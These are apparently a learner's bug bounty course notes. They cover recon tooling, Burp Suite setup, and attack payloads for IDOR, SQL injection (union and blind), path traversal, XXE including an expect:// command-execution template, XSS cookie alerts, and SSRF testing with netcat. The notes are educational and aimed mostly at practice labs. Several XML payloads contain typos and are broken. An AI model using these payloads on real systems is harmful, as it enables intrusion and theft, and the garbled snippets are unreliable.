Bug Bounty Hunting Course Jot Downs:

- OTW Natas
- Hacker101 CTF from HackerOne (Hacker 101)
- Hack The Box
- TryHackMe
- Port Swigger Labs

VW Ware: https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html
Kali Linux PreBuilt VM: https://www.kali.org/get-kali/#kali-virtual-machines

All About Recon::

$ How to choose my target?
- HackerOne logged out
- Check directory by date
--- larger attack surface
--- larger diversity of where attackers have already been
- Find something I'm really familiar with
- Newest Program
- Unpaid Program
- Follow developers
--- Lookout for github links and announcments 
--- be the first to know about new attack surfaces
- Github uses boolean search like google
- Search /robot.txt and visit disallowed files


$ nmap
- nmap -A -p- -Pn 10.10.10.223 -v : use this for CTF & HTB for scanning
- nmap -A -F -T1 10.10.10.223 -v : used to scan bug bounty ports. 
-- the -F scans first 100 ports
-- the -T is the speed or agression of scanning T1(slow) T5(most instrusive)
-- the -v will print out open port data as they are found
- nmap -A -p35, 445, 135, 139,80, 443 10.10.10.215 -v
--- Choosing specific ports to see if they are open

# SecLists | Daniel Miessler
- Full suit of web app security tools
- https://github.com/danielmiessler/SecLists
- git clone https://github.com/danielmiessler/SecLists.git
-- Save in opt file


$ ffuf/dirb/fuzzers
- ffuf -w /usr/share/wordlists/drb/common.txt -u http://tenet.htb/FUZZ -fc 403 -p 2
--- fc: fiters any specific codes I do not wan to see
--- p: delay in request from 0.1 seconds to 2 seconds
- ffuf -u https://FUZZ.yahoo.com/ -w /usr/share/wordlists/dirb/common.txt -p 1
--- u = url
--- FUZZ = location I want to fuzz (sub.domain in this case)
--- This will brute force anything comeback with status code "200"
--- w = wordlist being used as "FUZZ"
--- p = Speed between attempts in seconds
- dirb is like ffuf but fuzzes reursively
---- $ dirb yahoo.com

$ wpscan
- vulnerability scanner for websites built on wordpress
- checks all plugins to see if any are out of date
- check website theme age and see it's had updates
- wpscan --rul http://tenet.htb --e ap --plugins-detection aggressive

- Check for certificate expiration on sites
- Key Ports: 22, 80, 443, 1443, 3389


https://www.domain.com/blog/artical/search?param=42
- https:// = scheme
- www = sub domain
- domain = the domain
- .com = top domain level
- /blog/artical/search = path or location of contents
- ? = signifies query
- param=42 = parameter

During recon, save URLs that look interesting to go back and test later like:
- A url with ...com/some/location?id=xx or ?url=xx

$ dig
- dig axfr @10.10.10.123 friendszone.red
- Zone Transfers happen on port 53
--- dig axfr #10.10.10.123 friendzone.red > zone
--- dig axfr @10.10.10.123 frinedzoneportial.red >> zone
--- cat zone | grep frinedzone | grep IN | awk `{print $1}` | sort -u

$nslookup
- Run if port 53 is open to get some domain zone transfer infomation

$ whois
- This is like nslookup but much more info for pen testing
- domain name
- registry owner
- info about the domain and company

$ theHarvester
- Penetration testing recon tool
- looks for other domains/subs
- find email addresses to target
- theHarvester -d domain.com -b google

$ go
- sudo apt-get install golang

# waybackurls
- Check if sub.domains will resolve or not
- https://github.com/tomnomnom/waybackurls
- go install github.com/tomnomnom/waybackurls@latest

# amass enum -passive -d yahoo.com
- gives a bunch a sub domains to run waybackurls on
- Gives very broad spectrum of urls
- Great for a starting attack surface
- Make sure domains are in scope (public bounty)

# gedit
- tool for file creation and editing
- $ gedit yahoo.txt
- $ cat yahoo.txt | ./waybackurls > yahoo.urls
--- saves all sub domains to a file
- sudo apt-get install gedit

$ httprobe
- use amass to find all sub domains
- use waybackurl to see which sites are connected to real domains
- httprobe automates checking to see if each response resolves or not
--- this is how I know which ones to target
--- print results: cat yahoo.urls | httprobe > valid.urls

$ sublist3r
- tool used to find sub domains of websites
- sudo apt-get install sublist3r

OpenList
- Browser extension
- Enables me to open several URLs at the same time by pasting a list
- https://addons.mozilla.org/en-US/firefox/addon/openlist/

Wappalyzer
- finds what tech and languages are being used on a website
- browser extension tool to analyze the tech used on a specific site
- w3techs.com/sites does this as well
- checking the debugger in the browser devops console to find clues
- https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/

React Developers Tools
- browser exention tool so see which sites are uses the react framwork
- means javascript
- means I know what I'm looking at
- https://addons.mozilla.org/en-US/firefox/addon/react-devtools/

Burp Suite
- Use as a proxy for IP address
- https://portswigger.net/burp
- Set up a proxy for your local machine only listening 
--- In browser -> settings -> network settings -> 
---- Select Manual proxy configuration
---- HTTP Proxy: 127.0.0.1
---- port: 8080
--- Proxy -> Options -> Proxy Listeners
---- Select local ip (127...)
---- Import/Export CA cert
----- Export: Certificate in DER format as caCert.der (org cert. ca)
----- Save to accesible location
--- In browser -> settings -> privacy -> certificates -> view certs
---- import caCert.der (org. cert.ca)
---- May have to switch to all files to find .ca files
-- Internet connection on port 8080 should only world for local IP when proxy is running


######## URL HACKING ########

- Look for direcories first
--- use tool like dirb
--- Look for source code with 'view source code' and 'inspect'
--- might find hidden files or understand function of code
- Practice with
--- Hacker101 CTF
--- OTW Natas

# OWASP Juice Shop on TryHackMe
- Web Application vulnirability playground
- Able to connect through tryhackme: 
--- https://tryhackme.com/room/owaspjuiceshop
--- click start machine and x out of pop-up
--- click Access Machines -> OpenVPN -> download vpn config
--- Open Terminal in vpnconfig direcotry (usually defaults to downloads)
------ sudo apt install openvpn
------ sudo openvpn yourvpnconfig.ovpn (this will run server)
------ open the IP Address given on TryHackMe in browser
--- 1 hour time limit and need internet connection

# OWASP Juice Shop on localhost:3000
- https://sourceforge.net/projects/juice-shop/files/v9.1.3/
-- Version: juice-shop-9.1.3_node12_linux_x64.tgz
--- Download and save file
--- Open terminal in directory
--- tar -xvzf juic...tab
-- sudo apt-get install nodejs
-- sudo apt-get install npm
--- cd to juice shop folder
-- npm start
--- Juice Shop is now listening on localhost:3000

# Intercepting Juice Shop with Burp
- In brower new tab -> about:config (this is browser configuration)
- Search: network.proxy
- network.proxy.allow_hijacking_localhost: false -> true



######## IDOR (insecure direct object referencing) ########

With IDORs and business logic errors you can: 
- bypass payment and reerse payment options so that you are the one 
getting paid and recieving item
- Skip login pages
- Access someone else's account
- Find ways to write on someone else's news feed on social media platforms
- Leave feedback as someone else
- Edit another person's post or blog

Best way to test for IDOR and Logic errors:
- creating two accounts (attacker and victim)
- Always test against your own personal account
-- testing on account you don't own is always out of scope
- When looking for iput information, remember to look for hidden fields
-- <input type="hiden" name="admin" value="no"
-- To amake an admin account just need to change value="yes"
- With a cookie you might see something like userid-372623 and you can
change this value to 0 to gain admin privleges
- Change user-id to the user id of a second account you own and see
what you are able to manipulate on your second account that you are
not logged into
- Most of the time, you will be testing for IDORs inside BURP, however
you may find them in the URL
- IDORs where you buy something and you see inside the URL
-- www.website.com/invoice=12
-- You can try and change the 12 to 11 to get access to another customers's
invoice and sensitive information
-- www.webite.com/img-=87
-- In this case change the image to 86 and see what you can access

- Check out the logout fucntionality
-- Can lead to infomation disclosure
-- Even after someone logs out sometimes the previous page will be casched
and ou can look back at the URL
-- Possible to open a browser and hit the back button and go to previous page


# CyberChef
- Decoder/Encoder
- Useful to check cookie id content from burp
- Use Magic in recipe colum and past cookie id in input section

#  Intruder (Burp)
- Helps stream like attack tests
- Right click request and send to instruder
- Intruder tab -> positions
-- All highlighted areas are possible param postions
-- Click clear to clear out selected postions
-- Look for spots for things like ID
--- hightlight selected aread and click Add (symbol) button
- Payload tab will be the data iterating through selected postion
-- Payload set = 1 (postions)
-- Payload type = Simple List
-- Add list items to Payload Options
-- Click Start Attack

Business logic tip:
- Check payloads with burp proxy interception
-- See if attributes can be changed or added
-- Sending to repeater and trying sem send requests to see what 
objects are formed
-- Some objects may hove "role", "quantity", or "price" attributes
 that can be changed/added etc..
-- Make sure to walk through the proccessing steps with the Forward button
until it's blank to check for opportunities
-- Treat like debugger stepper


######## SQL Injections ########

CheatSheet for:
- Oracle
- Microsoft
- PostgreSQL
- MySQL
-- https://portswigger.net/web-security/sql-injection/cheat-sheet

Comment Symbols:
Oracle: --
Microsoft MySQL: #

Version:
Oracle: BANNER FROM V$version
MySQL: @@version

Default Table:
All DB's Except Oracle: information_schema.tables/columns
Oracle: all_tables/all_tab_columns


- Start with input forms and use quotes to catch data entry errors
-- single quote = '
-- double quote = "
--- no space after "=" sign
-- ex: SELECT * FROM users WHERE username = "{my input}";
------ SELECT * FROM users WHERE username = "(")" // adding quote will close query
-- SELECT * FROM Users.users.... : Users = db users = table
- 501: internal service network errors
-- A 'true' statment must be made between the query quotes to not crash
------ input: asdf OR 1 = 1;# (# comments out org closing quote based on db type)

- Checking the number of columns a table may have
- SELECT * FROM users WHERE username =' UNION SELECT + NULL, NULL..;#
--- GET/api/path=here'UNION+SELECT+NULL,NULL..-- (-- comments out remaining query)
------- If HTTP 200 response: Num of NULL = Num of Columns
-- input: asdf' UNION SELECT NULL,NULL,NULL;#
---- Union select will add onto the query
---- If this is successful that means there are 3 columns
---- if not then server may crash and there are less than 3 columns

- Checking which colums except string data
-- GET/api/path=here'UNION+SELECT+NULL,'test',NULL--
---- Enter single quote string data in place of each NULL in GET request
---- If HTTP 200 response code: respective column accepts string data

- Pulling Down Information from DB table
--- TIP: if I am querying on 2 columns but table has 3 I must include the NULL columns
--- FROM: GET/api/path=here'UNION+SELECT+col1,col2,NULL--
--- TO: GET/api/path=here'UNION+SELECT+NULL+col1,+col2--
------- this is after knowing the column names
------- if UNION with another table:
----------- GET/api/path=here'UNION+SELECT+NULL+col1,+col2+FROM+table--

-- Comb through the html to find table elements
-- Union command will add results right on top of existing table data


-- TIP: On Oracle datbase, every SELECT statment must specify a table to 
select FROM
---- If my UNION SELECT attact does not query fron a table 
---- I will still need to include the FROM keyword folllowed by a valid name
---- THere is a built in table on Oracle calle DUAL which I can use for this purpose
--------- ex: 'UNION+SELECT 'abc' FROM DUAL
--------- ex: GET/api/path=here'UNION+SELECT+NULL,NULL+FROM+DUAL


- Pulling Down Database Type and Version
---- Oracle
-- GET/api/path=here'UNION+SELECT+NULL,NULL+FROM+DUAL--
-- GET/api/path=here'UNION+SELECT+'test','test'+FROM+DUAL--
-- GET/api/path=here'UNION+SELECT+BANNER,NULL+FROM+V$version--
------ If all NULL test pass as compatible with string, only 1 is needed 
to pull down the db Banner
------ V$version table is specific to Oracle db
---- MySQL
-- GET/api/path=here'UNION+SELECT+NULL,NULL#
-- GET/api/path=here'UNION+SELECT+'test','test'#
-- GET/api/path=here'UNION+SELECT+@@version,NULL#
------ @@version table is specific to MySQL db

- Determining Name of Table and it's Columns then Retrieve Data
-- First find out my column count and which are string compatible
-- GET /api/path=here'UNION+SELECT+NULL,NULL--
-- GET /api/path=here'UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
---- Once I find the table name I'm looking for..
-- GET /api/path=here'UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='my_table_name'--
---- Retrieve data once I have my table and it's columsn..
-- GET /api/path=here'UNION+SELECT+my_col_1,my_col_2+FROM+my_table--


# Blind SQL Injection
- SQL within Cookie ID
-- forward intercepted request to locate the session cookie "TrackingId"
-- send request in repeater a few times checking "Content-Length" does
not change
-- If no change check for SQL vuln by add single quote after TrackingId
----- If the number changes a SQL injection vuln may exist
----- Compare clean and dirty response code for any differneces
----- If differences exist I have invoked an error
-- Test if TrackingId accepts SQL queries with a 'true' statement
----- ex: TrackingId:4938498'OR+1=1--
--- Then Deep Test..
----- ex: TrackingId:4938498'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--
--- Checking password length
----- ex: TrackingId:4938498'UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--
----------- then gradually moving greaterthan amount up or down
----- ...+AND+substring(password,1,1)='a'--
----------- This would look for the password letter by letter
----------- password is the object
----------- first arg is the position of char
----------- second arg is number of char
----------- ='a' is the the first char to check if true
------- Send to intruder (Burp)
--------- Clear positions
--------- Setup Payload
------------ Highlight and 'Add' parameters that will be effected (char position and char being checked)
------------ tip: use cluster bomb setting
---------- Setup Payloads
------------- Payload set numbers go in order of position appearance
-------------------- Payload Set: 1
-------------------- Payload type: numbers
-------------------- Type: Sequential
-------------------- From: 1
-------------------- To: 30
-------------------- Step: 1
-------------------- Payload Set: 2
-------------------- Payload type: Simple List
------------------------ type or add char list file
----------- Start Attack
-------------- Very slow and sending all 504 status codes
-------------- Use "Match" bar in results add column to check off all 'true' matches in source code
------------------- To add match:
---------------------- Options -> Grep Match -> clear and enter my 'match'

------- Manual Approach (Blind SQL Injection w/Time Delay
-- To run a time delay
--- TrackingID=498378'||pg_sleep(10)--
------ Every DB command is different
------ This one is specific to PostgreSQL DB


######## Directory Path Traversal ########

- Used in url bar to try and find access vulns through file direcotry
-- Starting from home = /
-- Go back 1 parent directory = ../
-- Go back 2 parent directories = ../../
-- Far enought to hit the root and now I have access to root files
----- See if the request will allow access to files root directory
----- ex: GET /filename=/etc/passwd
-- If traversal sequences are stripped non-recursively:
----- GET /filename=....//etc/passwd

-- URL-Decoding
---- ..%252f
---- ex: GET /filename=..%252fect/password

Using Burp Suite
-- Intecept client request and send a few requests to repeater for examination
-- Find places to test path traversal
---- GET /image?filename=../../../etc/passwd
---- GET filter/category/products=../../etc/passwd
-- 200 success code shows you have accessed the target

$ dotdotpwn
-- Automated approach to path traversal
---- sudo apt-get install dotdotpwn
---- $ dotdotpwn -m http -h localhost:3000/#/login



####### XML External Entity (XXE) Injection ########

-- OWASP xxe Payload Cheatsheet
	- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

Accessing a local resource that may not return
-- Template:
	<?xml version-"1.0" encoding="ISO-8859-1"?>
	<!DOCtYPE foo [
		<!ELEMENT foo ANY >
		<1ENTITY xxe SYSTEM 'file:///dev/random'>]>
	<foo>&xxe;</foo>
-- Example:
	- Intercept checkout request
		<?xml version="1.0" encdoing"UTFo-8"?>
			<!DOCTYPE foo [
			<!ENITITY xxe SYSTEM 'file:///etc/passwd' >]>
		<stockCheck>
			<productId>
				2 // Here is where I could insert $xxe; to exec.
			</productId>
			<storeId>
				1
			</storeId>

-- File Execution
	- Create xxe.xml file with execution code template and save changes
		<?xml version-"1.0" encoding="UTF-8"?>
		<!DOCtYPE foo [
		    <!ELEMENT foo ANY >
		    <1ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
		<foo>&xxe;</foo>

	- Find "Browse Files" button or where I would upload a file
	- Upload xml file and intercept submit request to locate xml file

-- Manual Execuation
	- Find file/form sumbit and intercept
	- Decode data with Burp inspector or Decoder
	- Once decoded to xml make changes to response and reverse encode
	- Send modified xml request
	- Decode response for results

-- Remote Code Execution
	- Template
		<?xml version-"1.0" encoding="UTF-8"?>
		<!DOCtYPE foo [
		    <!ELEMENT foo ANY >
		    <1ENTITY xxe SYSTEM 'expect://id' >]>
		<creds>
		    <user>&xxe;</user>
		    <pass>mypass</pass>
		</creds>
	- Pulling shell creds from db files like db.php should work

- TIP: file roots wih /bin usually means there's a shell to connect to
- TIP: db shell username and passwords can be found in db.php files

-- Pulling a db.php file with PHP wrapper
	- From: <?xml version="1.0" encdoing"UTFo-8"?>
			<!DOCTYPE foo [
			<!ENITITY xxe SYSTEM 'file:///etc/db.php' >]>
	- To: <?xml version="1.0" encdoing"UTFo-8"?>
			<!DOCTYPE foo [
			<!ENITITY xxe SYSTEM 'fiphp://filterconvert.base64.encode/resources/var/www.html/db.php' >]>




####### XSS Cross Site Scripting ########

- XXS Payloads Cheat Sheet
	- https://github.com/payloadbox/xss-payload-list

- Heavy in HTML and JavaScript
- In Bug Bounty Programs if you can make an alert pop up that's CTF
	- Example:
		- Input field:
			- <img src onerror="alert('CTF')"/>
			- <img src onerror="prompt('Login')"/>
			- <img src onerror="alert(document.cookie)"/>
		- src not being assigned a string throws the error which causes an alert
			- <img src="skfj" onerror="alert('do something')"/>
		-alert() will do/display something
		- prompt will ask for input/need something
- If there is a search bar.. check there first!
	- <script>alert(1)</script>
- I should black list words/chars.. to prevent xss
	- To get around this users can play with capitalization or encoding
	- To blacklist chars:
		<h1 dangerouslySetInnerHTML={{__html: pure}} /> Banned Characters<br></br>
		<input value=(pure) onChanges{e => setPure(e.target.value.replace(/[#_/]/g,""))} />

		<h1 dangerouslySetInnerHTML={{ __html: DOMpurify.santize(userInput) }} /> Sanatized with DOMPurify default settings<br></br>
		<input value-{userInput} onChnage={e => setInput(e.target.value.replace())} />

- Tip: If backslash is blacklisted use a button tag
	- Input field
		- <button onclick="alert('CTF')">
- Tip: To breakout of a JavaScript script String
	- </script><script>alert(1)</script>



####### HTML & JavaScript ########

- HTML is great to know to inpsect sites and breakout of code lines

- <hr size="?">
- Next Line = <br>
- Emphasize = <em></em>
- Strong = <strong></strong>
- Hidden = hidden keyword attribute

- Tip: <img src=""/> tag renders automatically on pages

-- Check for XSS in URL bar
	- If adding a parameter changes the output when inpsecitng
		- google.com/?search=xss
		- inspect: google.com/xss in source code script

- Practicing JavaScript
	- Chrome Developer Tools
	- Sources -> dowble-arrow -> snippets -> index.js



####### API Enumeratioin ########

- Use ffuf and a wordlist to enumerate API endpoints
	- ffuf -u http://url.here/FUZZ -w /path/to/wordlist.txt
	- ffuf -u http://url.here/or/FUZZ -w /path/to/wordlist.txt
	- ffuf -u http://url.here/FUZZ/also -w /path/to/wordlist.txt


####### SSRF Server Side Request Forgery ########

- Enables unauthorized access to server data
- How it works
	- Hacker sends manipulated Url to Website
	- Website makes Hacker's request to Server
	- Server responds to Website with data requested
	- Hacker can access returned data on Website

- The problem with SSRF is the ability to manipulate a URL request mid process
	- Dead Giveaways:
		- Input field asking for a file URL
		- www.website.com/beta.php?url=/
			- if the query is pointing to root "/" access or any file really

- Way to Check for SSRF in Terminal
	- Use NetCat listener
		$ nc -lvnp 80 // port 80
	- This wil listen to all activity on port 80 (HTTP)
	- Enter target's URL in search/input field and submit
		- If Request should hang I can cancel out in terminal
		- Terminal wil print results
	- If vulnerable:
		- Text content of URL page should print on screen
		- Now able to traverse the URL I targeted
			- Scan and listen to ports

?? etc/host file ??




####### Command Injection ########
####### File Upload ########
####### LFI & RFL ########
####### Cookies & Tokens ########
####### Wordpress & CMS ########



$ Juice Shop
- TODO: 

$ Port Swigger
- TODO: 
-- Blind SQL Injection with conditional response
-- Blind SQL Injection with conditional errors










